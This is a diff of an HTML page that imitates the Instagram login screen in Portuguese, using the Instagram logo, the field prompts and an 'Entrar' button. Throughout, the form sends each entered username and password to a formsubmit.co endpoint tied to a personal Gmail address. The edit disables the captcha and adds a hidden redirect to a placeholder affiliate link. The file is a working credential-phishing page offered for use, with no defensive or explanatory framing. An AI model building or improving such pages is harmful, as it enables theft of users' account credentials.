@@ -6,66 +6,68 @@
   <title>Instagram</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
       background-color: #fafafa;
+      font-family: 'Arial', sans-serif;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
-      margin: 0;
+      height: 100vh;
     }
-    .container {
-      margin-top: 50px;
+    .login-box {
       background: white;
       padding: 40px 30px;
       border: 1px solid #dbdbdb;
-      width: 300px;
+      text-align: center;
+      width: 100%;
+      max-width: 320px;
     }
-    .logo {
-      display: block;
-      margin: 0 auto 20px;
-      width: 180px;
+    .login-box img {
+      width: 175px;
+      margin-bottom: 30px;
     }
-    input {
+    .login-box input {
       width: 100%;
       padding: 10px;
-      margin-bottom: 10px;
-      background: #fafafa;
+      margin: 6px 0;
       border: 1px solid #dbdbdb;
-      border-radius: 3px;
+      border-radius: 4px;
+      background: #fafafa;
     }
-    button {
-      width: 100%;
-      padding: 10px;
+    .login-box button {
       background-color: #3897f0;
       color: white;
       border: none;
-      border-radius: 3px;
+      padding: 10px;
+      width: 100%;
+      border-radius: 4px;
       font-weight: bold;
-      cursor: pointer;
+      margin-top: 10px;
     }
     .footer {
       margin-top: 20px;
-      font-size: 12px;
+      font-size: 13px;
       color: #8e8e8e;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img class="logo" src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram">
-    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
-      <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
-      <input type="password" name="password" placeholder="Senha" required>
 
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_template" value="table">
-      <input type="hidden" name="_next" value="https://instagram.com">
+  <form class="login-box" method="POST" action="https://formsubmit.co/natanaelverissimo34@gmail.com">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo"/>
+    
+    <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required />
+    <input type="password" name="password" placeholder="Senha" required />
+    
+    <!-- Redirecionamento após envio -->
+    <input type="hidden" name="_redirect" value="https://seulinkCPA.com" />
+    <input type="hidden" name="_captcha" value="false" />
+    
+    <button type="submit">Entrar</button>
 
-      <button type="submit">Entrar</button>
-    </form>
-  </div>
-  <div class="footer">
-    © 2025 Instagram do Meta
-  </div>
+    <div class="footer">
+      Esqueceu a senha?
+    </div>
+  </form>
+
 </body>
 </html>
